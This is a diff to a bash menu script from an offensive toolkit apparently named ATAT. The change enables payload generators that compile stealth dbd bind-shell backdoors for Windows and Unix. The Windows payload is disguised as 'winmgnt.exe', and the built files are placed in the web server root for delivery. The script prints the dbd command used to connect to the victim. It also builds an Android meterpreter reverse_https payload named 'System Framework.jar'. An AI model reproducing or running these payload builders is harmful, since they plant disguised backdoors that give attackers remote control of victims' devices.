@@ -323,8 +323,8 @@ done
 # Accept upper or lowercase input.
 echo -e "\E[1;34m::::: \e[97mPersistence Generator \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mThanks to Skysploit for the DBD Builder!! \E[1;34m:::::"
-PS3='Enter your choice 4=QUIT: '
-options=("Windows DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Android" "Quit") # "Windows DBD Bind Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell"
+PS3='Enter your choice 6=QUIT: '
+options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell (Work In Progress)" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "Android" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -367,31 +367,31 @@ do
 				clear
 			fi
             ;;
-#      "Windows DBD Bind Shell")
-#       read -p "What port would you like the victim be listening on? " attackerport
-#		echo ""
-#		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
-#		echo ""
-#		echo -e "\e[1;34mGenerating your payload...\e[0m"
-#		echo ""
-#		sleep 3
-#		sed "/HOST/s/attackerip/$attackerip/g" ~/ATAT/misc/dbd/conf/dbd_win_bind.conf > ~/ATAT/misc/dbd/dbd_win_bind1.conf
-#		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_bind_reverse1.conf > ~/ATAT/misc/dbd/dbd.h
-#		rm ~/ATAT/misc/dbd/dbd_win_bind1.conf
-#		cd ~/ATAT/misc/dbd/
-#		make mingw-cross CFLAGS=-DSTEALTH
-#		cp ~/ATAT/misc/dbd/dbd.exe /var/www/html/winmgnt.exe
-#		clear
+       "Windows DBD Bind Shell (Work In Progress)")
+        read -p "What port would you like the victim be listening on? " attackerport
+		echo ""
+		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
+		echo ""
+		echo -e "\e[1;34mGenerating your payload...\e[0m"
+		echo ""
+		sleep 3
+		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_win_bind.conf > ~/ATAT/misc/dbd/dbd_win_bind1.conf
+		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_win_bind1.conf > ~/ATAT/misc/dbd/dbd.h
+		rm ~/ATAT/misc/dbd/dbd_win_bind1.conf
+		cd ~/ATAT/misc/dbd/
+		make mingw-cross CFLAGS=-DSTEALTH
+		cp ~/ATAT/misc/dbd/dbd.exe /var/www/html/winmgnt.exe
+		clear
 		#rm dbd.exe
-#		cd ~/ATAT
-#		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.exe\e[0m"
-#		echo ""
-#		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
-#		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
-#		echo ""
-#		read -p "Press any key to contiue" enter
-#		clear
-#           ;;
+		cd ~/ATAT
+		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.exe\e[0m"
+		echo ""
+		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
+		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
+		echo ""
+		read -p "Press any key to contiue" enter
+		clear
+            ;;
         "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell")	
 		clear
 		read -p "Where shall I send your persistent shell? " attackerip
@@ -433,33 +433,33 @@ do
 				clear
 			fi
 			;;
-#		"Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell")
-#		clear
-#		read -p "What port would you like the victim be listening on? " attackerport
-#		echo ""
-#		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
-#		echo ""
-#		echo -e "\e[1;34mGenerating your payload...\e[0m"
-#		echo ""
-#		sleep 3
-#		sed "/HOST/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_unix_bind.conf > ~/ATAT/misc/dbd/dbd_unix_bind1.conf
-#		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_unix_bind1.conf > ~/ATAT/misc/dbd/dbd.h
-#		rm ~/ATAT/misc/dbd/dbd_unix_bind1.conf
-#		cd ~/ATAT/misc/dbd/
-#		make unix
-#		chmod +x dbd
-#		cp ~/ATAT/misc/dbd/dbd /var/www/html
+		"Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell")
+		clear
+		read -p "What port would you like the victim be listening on? " attackerport
+		echo ""
+		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
+		echo ""
+		echo -e "\e[1;34mGenerating your payload...\e[0m"
+		echo ""
+		sleep 3
+		sed "/HOST/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_unix_bind.conf > ~/ATAT/misc/dbd/dbd_unix_bind1.conf
+		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_unix_bind1.conf > ~/ATAT/misc/dbd/dbd.h
+		rm ~/ATAT/misc/dbd/dbd_unix_bind1.conf
+		cd ~/ATAT/misc/dbd/
+		make unix
+		chmod +x dbd
+		cp ~/ATAT/misc/dbd/dbd /var/www/html
 		#rm dbd
-#		clear
-#		cd ~/ATAT
-#		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
-#		echo ""
-#		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
-#		echo "dbd -nv victim.host.orip $attackerport -k $attackersecret"
-#		echo ""
-#		read -p "Press any key to contiue" enter
-#		clear
-#	        ;;
+		clear
+		cd ~/ATAT
+		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
+		echo ""
+		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
+		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
+		echo ""
+		read -p "Press any key to contiue" enter
+		clear
+	        ;;
         "Android")
         read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
 			msfvenom -f raw -p android/meterpreter/reverse_https LHOST=$userhost LPORT=$userport -o "System Framework.jar"
